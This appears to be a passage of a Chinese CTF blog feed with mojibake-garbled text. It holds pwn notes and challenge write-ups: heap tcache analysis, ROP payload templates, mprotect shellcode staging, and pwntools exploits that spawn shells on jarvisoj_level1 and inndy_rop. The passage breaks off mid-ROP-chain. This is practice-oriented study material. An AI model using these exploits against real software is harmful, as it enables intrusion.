<code>TCACHE_MAX_BINS</code> ) æ—¶ï¼ŒåŒå¤§å°çš„ small bin ä¼šæ”¾è¿› tcache ä¸­ (è¿™ç§æƒ…å†µå¯ä»¥ç”¨ <code>calloc</code> åˆ†é…åŒå¤§å°å †å—è§¦å‘ï¼Œå› ä¸º <code>calloc</code> åˆ†é…å †å—æ—¶ä¸ä» tcache bin ä¸­é€‰å–)ã€‚åœ¨è·å–åˆ°ä¸€ä¸ª <code>smallbin</code> ä¸­çš„ä¸€ä¸ª chunk åä¼šå¦‚æœ tcache ä»æœ‰è¶³å¤Ÿç©ºé—²ä½ç½®ï¼Œä¼šå°†å‰©ä½™çš„ small bin é“¾å…¥ tcache ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­åªå¯¹ç¬¬ä¸€ä¸ª bin è¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œåé¢çš„å †å—çš„æ£€æŸ¥ç¼ºå¤±ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™æ¬¡callocçš„æ˜¯0x555555757250è¿™ä¸ªchunkï¼Œè€Œ0x555555757390å’Œ0x7fffffffde80åˆ™æ”¾å…¥äº†tcacheä¸­ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ—¶stack_var[2]å·²ç»æ”¾å…¥äº†tcacheä¸­ï¼Œé‚£ä¹ˆä¸‹æ¬¡callocå³å¯å¾—åˆ°ä½äºstackçš„ä¸€ä¸ªchunkï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  6]: 0x5555557573a0 â€”â–¸ 0x5555557576c0 â€”â–¸ 0x555555757620 â€”â–¸ 0x555555757580 â€”â–¸ 0x5555557574e0 â€”â–¸ 0x555555757440 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x555555757390 â€”â–¸ 0x5555557576c0 â—‚â€” 0x0</span><br><span class="line">BK: 0x7fffffffde90 â—‚â€” 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯è¿™æ ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> info locals</span> </span><br><span class="line">stack_var = &#123;0, 0, 93824994341792, 0, 140737351834928, 0 &lt;repeats 11 times&gt;&#125;</span><br><span class="line">chunk_lis = &#123;0x555555757260, 0x555555757300, 0x5555557573a0, 0x555555757440, 0x5555557574e0, 0x555555757581, 0x555555757620, 0x5555557576c0, 0x555555757760, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">target = 0x7fffffffde90</span><br><span class="line">__PRETTY_FUNCTION__ = &quot;main&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»£ç æ˜¯how2heapä¸­libc2.27çš„ä»£ç &lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>PWNåˆ·é¢˜å°ç»“</title>
    <link href="http://example.com/2021/08/08/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/08/08/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2021-08-07T16:00:00.000Z</published>
    <updated>2021-12-09T06:24:53.381Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-æ‚"><a href="#1-æ‚" class="headerlink" title="1.æ‚"></a>1.æ‚</h1><p>Ubuntu 18ä¸‹å¶å°”ä¼šå‘ç”Ÿæ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¤šretnå‡ æ¬¡å°±å¥½äº†ã€‚</p><p><code>strlen()</code>å‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé‡åˆ°<code>&#39;\x00&#39;</code>æ—¶ä¼šç»ˆæ­¢ï¼Œè€Œ<code>gets()</code>å‡½æ•°é‡åˆ°<code>&#39;\x00&#39;</code>å¹¶ä¸ä¼šæˆªæ–­</p><h2 id="sys-write-puts-printf"><a href="#sys-write-puts-printf" class="headerlink" title="sys,write,puts,printf"></a>sys,write,puts,printf</h2><p>system(â€œ/binshâ€)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p32(e.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p64(pop_rdi_ret) +  p64(sh_addr) + p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_plt) + p64(<span class="number">0xdeadbeef</span>)</span><br></pre></td></tr></table></figure><p>write:è¾“å‡ºï¼Œreadï¼ˆä¸º0ï¼Œè¾“å…¥ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p32(write_plt) + p32(<span class="number">0x8048474</span>) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got)</span><br><span class="line">p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got)</span><br><span class="line">p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>puts  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br></pre></td></tr></table></figure><p>printf:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(printf_plt) + p32(main_addr) + p32(fmtstr_addr) + p32(printf_got)</span><br><span class="line">p32(printf_plt) + p32(vuln_addr) + p32(fmt_addr) + p32(printf_got)</span><br></pre></td></tr></table></figure><h2 id="ä¼ å‚"><a href="#ä¼ å‚" class="headerlink" title="ä¼ å‚"></a>ä¼ å‚</h2><p>32ä¼ å‚ï¼š</p><ul><li>  ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ eaxï¼Œç„¶åå°†å‚æ•° ä»å·¦åˆ°å³ ä¾æ¬¡å­˜å…¥ ebxï¼Œecxï¼Œedxå¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨eaxå¯„å­˜å™¨</li><li>  è°ƒç”¨å·ï¼š<code>sys_read</code> çš„è°ƒç”¨å· ä¸º 3ï¼Œ<code>sys_write</code>çš„è°ƒç”¨å· ä¸º 4</li><li>  è°ƒç”¨æ–¹å¼: ä½¿ç”¨ <code>int 80h</code>ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨</li></ul><p>64ä½ä¼ å‚ï¼š</p><ul><li>  ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ raxï¼Œç„¶åå°†å‚æ•° ä»å·¦åˆ°å³ ä¾æ¬¡å­˜å…¥ <code>rdi, rsi, rdx, rcx, r8, r9</code>å¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨raxå¯„å­˜å™¨</li><li>  è°ƒç”¨å·ï¼š<code>sys_read</code> çš„è°ƒç”¨å· ä¸º 0 ï¼Œ<code>sys_write</code> çš„è°ƒç”¨å· ä¸º 1ï¼Œ</li><li>  stub_execve çš„è°ƒç”¨å· ä¸º 59 stub_rt_sigreturn çš„è°ƒç”¨å· ä¸º 15</li><li>  è°ƒç”¨æ–¹å¼: ä½¿ç”¨ syscall è¿›è¡Œç³»ç»Ÿè°ƒç”¨</li></ul><h2 id="å…³é—­aslr"><a href="#å…³é—­aslr" class="headerlink" title="å…³é—­aslr"></a>å…³é—­aslr</h2><p><strong>echo 0 &gt; /proc/sys/kernel/randomize_va_space</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~$ cyclic <span class="number">50</span></span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br><span class="line">gwt@ubuntu:~$ cyclic -l <span class="number">0x61616166</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="å…³äºrecvåœ°å€"><a href="#å…³äºrecvåœ°å€" class="headerlink" title="å…³äºrecvåœ°å€"></a>å…³äºrecvåœ°å€</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœç›´æ¥è¿”å›åœ°å€ï¼š%pè¿™ç§ï¼š</span><br><span class="line">stack_addr = int(io.recvuntil(&#x27;\n&#x27;,drop=True),16)</span><br><span class="line"></span><br><span class="line">å¦‚æœæ˜¯è¿™ç§ï¼š</span><br><span class="line">[DEBUG] Received 0x2c bytes:</span><br><span class="line">    00000000  42 79 65 62  79 65 7e 0a  a0 8a 14 5c  7e 7f 0a 57  â”‚Byebâ”‚ye~Â·â”‚Â·Â·Â·\â”‚~Â·Â·Wâ”‚</span><br><span class="line">    00000010  65 6c 63 6f  6d 65 20 74  6f 20 41 43  54 46 27 73  â”‚elcoâ”‚me tâ”‚o ACâ”‚TF&#x27;sâ”‚</span><br><span class="line">    00000020  20 62 61 62  79 73 74 61  63 6b 21 0a               â”‚ babâ”‚ystaâ”‚ck!Â·â”‚</span><br><span class="line">é‚£ä¹ˆ</span><br><span class="line">puts_addr = io.recvuntil(&#x27;\x7f&#x27;)[-6:]</span><br><span class="line">puts_addr = puts_addr.ljust(8,&#x27;\x00&#x27;)</span><br><span class="line">print hex(u64(puts_addr))</span><br></pre></td></tr></table></figure><h1 id="1-Stack"><a href="#1-Stack" class="headerlink" title="1.Stack"></a>1.Stack</h1><h2 id="1-æ ˆè¿ç§»"><a href="#1-æ ˆè¿ç§»" class="headerlink" title="1.æ ˆè¿ç§»"></a>1.æ ˆè¿ç§»</h2><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(sys_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(buf_add+<span class="number">12</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;a&#x27;</span> + p32(buf_add-<span class="number">4</span>) + p32(leave)</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+ p32(sys_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(buf_add+<span class="number">16</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += (<span class="number">0x28</span> - <span class="built_in">len</span>(payload))* <span class="string">b&#x27;a&#x27;</span> + p32(buf_add) + p32(leave)</span><br></pre></td></tr></table></figure><p>â€‹    <img src="/2021/08/08/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/906508_BQAUCW64WPUTJ8N.png" alt="img"></p><h2 id="2-mprotect"><a href="#2-mprotect" class="headerlink" title="2.mprotect"></a>2.mprotect</h2><p>mprotectå‡½æ•°ï¼Œå¯ä»¥ä¿®æ”¹å†…å­˜æ®µçš„æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr å†…å­˜å¯å§‹åœ°å€</span><br><span class="line">len  ä¿®æ”¹å†…å­˜çš„é•¿åº¦</span><br><span class="line">prot å†…å­˜çš„æƒé™</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">æ ˆæº¢å‡ºåˆ°mprotectå‡½æ•°ï¼ˆcall==push+jmpï¼‰</span><br><span class="line">æ‰€ä»¥retåè¦ç•™ä¸€ä¸ªè¿”å›åœ°å€ï¼Œå› ä¸ºretå°±ç›¸å½“äºjmpåˆ°mprotectã€‚</span><br><span class="line">payloadå¤§è‡´ä¸ºï¼š</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect_add)+p32(ret_add)</span><br><span class="line">payload+=p32(argu1) + p32(argu2) +p32 (argu3)</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«ä¿®æ”¹å†…å­˜çš„åœ°å€ï¼š<span class="number">0x80ea000</span></span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¢«ä¿®æ”¹å†…å­˜çš„å¤§å°ï¼šå¿…é¡»æ˜¯é¡µçš„æ•´æ•°å€ï¼Œ<span class="number">0x1000</span></span><br><span class="line">ç¬¬ä¸‰å‚æ•°å€¼æƒé™ï¼š<span class="number">0x7</span></span><br><span class="line">ç„¶åæ‰¾ä¸ªpopæ¥å¹³è¡¡å †æ ˆï¼š</span><br><span class="line">ROPgadget --binary get_started_3dsctf_2016 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">å› ä¸ºæ˜¯<span class="number">3</span>ä¸ªå‚æ•°ï¼Œå°±æ‰¾<span class="number">3</span>ä¸ªpop</span><br><span class="line">ç°åœ¨payloadï¼š</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> + <span class="number">0x38</span> + p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) + p32 (mem_proc) + p32(ret_addr2)</span><br><span class="line"></span><br><span class="line">ret_addr2æ˜¯readå‡½æ•°çš„åœ°å€ï¼Œå°†shellcodeå†™å…¥å†…å­˜ã€‚</span><br><span class="line">readå‡½æ•°åŸå‹ï¼š</span><br><span class="line">ssize_t read(<span class="built_in">int</span> fd, void *buf, size_t count);</span><br><span class="line">fd è®¾ä¸º<span class="number">0</span>æ—¶å°±å¯ä»¥ä»è¾“å…¥ç«¯è¯»å–å†…å®¹</span><br><span class="line">buf è®¾ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å†…å­˜åœ°å€    </span><br><span class="line">size é€‚å½“å¤§å°ï¼Œè¶³å¤Ÿå†™å…¥shellcodeå°±OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_ret) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line">payload += p32(mem_size)  </span><br><span class="line">payload += p32(mem_proc)   </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop3_ret)  </span><br><span class="line">payload += p32(<span class="number">0</span>)     </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x1000</span>) </span><br><span class="line">payload += p32(mem_addr) </span><br></pre></td></tr></table></figure><h1 id="3-Heap"><a href="#3-Heap" class="headerlink" title="3.Heap"></a>3.Heap</h1><h2 id="1-Tchache"><a href="#1-Tchache" class="headerlink" title="1.Tchache"></a>1.Tchache</h2><p>æ¯æ¡é“¾æœ€å¤š7ä¸ªï¼Œæ»¡äº†åæ”¾å…¥fastbinä¸unsortedbinã€‚</p><p>mallocæ—¶ä¼˜å…ˆå»tcacheä¸­æ‰¾ã€‚</p><p>tcacheæœ€å¤§ä¸º0x400ï¼Œå¤§äºå°±ä¼šæ”¾å…¥unsortedbinã€‚</p><p><strong>ä¸€äº›åˆ©ç”¨å§¿åŠ¿</strong></p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>double free</p><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>freeæ‰ä¼ªé€ çš„chunkï¼Œè¿™é‡Œä¸ä¼šå¯¹sizeå‰åçš„chunkè¿›è¡Œæ£€æŸ¥</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>ä¿®æ”¹éœ€è¦è¢«freeçš„sizeä½ï¼Œï¼ˆåŒ…å«å…¶ä»–chunk</p><h3 id="perthread-corruption"><a href="#perthread-corruption" class="headerlink" title="perthread_corruption"></a>perthread_corruption</h3><p>æ§åˆ¶tcacheçš„ç®¡ç†ç»“æ„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;1-æ‚&quot;&gt;&lt;a href=&quot;#1-æ‚&quot; class=&quot;headerlink&quot; title=&quot;1.æ‚&quot;&gt;&lt;/a&gt;1.æ‚&lt;/h1&gt;&lt;p&gt;Ubuntu 18ä¸‹å¶å°”ä¼šå‘ç”Ÿæ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¤šretnå‡ æ¬¡å°±å¥½äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strl</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWNåˆ·é¢˜_0x30-0x3F</title>
    <link href="http://example.com/2021/07/18/BUU-PWN-0x30-0x3f/"/>
    <id>http://example.com/2021/07/18/BUU-PWN-0x30-0x3f/</id>
    <published>2021-07-17T16:00:00.000Z</published>
    <updated>2021-09-07T12:37:42.319Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x30-jarvisoj-level1"><a href="#0x30-jarvisoj-level1" class="headerlink" title="0x30.jarvisoj_level1"></a>0x30.jarvisoj_level1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p?\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmdï¼Œè¿™é¢˜ç»™çš„é¢˜ç›®å’Œå¹³å°çš„é¢˜ä¸å¤ªä¸€æ ·ï¼Œæ­£å¸¸è¿™é“é¢˜çš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,29905)</span></span><br><span class="line">buf_addr = <span class="built_in">int</span>(io.recv()[-<span class="number">12</span>:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload +=(<span class="number">0x88</span>+<span class="number">4</span>-<span class="built_in">len</span>(asm(shellcraft.sh())))*<span class="string">&#x27;a&#x27;</span> + p32(buf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(buf_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>åªèƒ½ret2libcäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level1&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./level1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29905</span>)</span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">base = read - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span> + p32(system_add) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x31-inndy-rop"><a href="#0x31-inndy-rop" class="headerlink" title="0x31.inndy_rop"></a>0x31.inndy_rop</h1><h2 id="è§£æ³•ä¸€ï¼šROP"><a href="#è§£æ³•ä¸€ï¼šROP" class="headerlink" title="è§£æ³•ä¸€ï¼šROP"></a>è§£æ³•ä¸€ï¼šROP</h2><p>é™æ€ç¼–è¯‘ï¼Œå¯ä»¥ç›´æ¥ropgadgetæ‰¾ropé“¾ï¼š<code>ROPgadget --binary rop --ropchain</code></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span 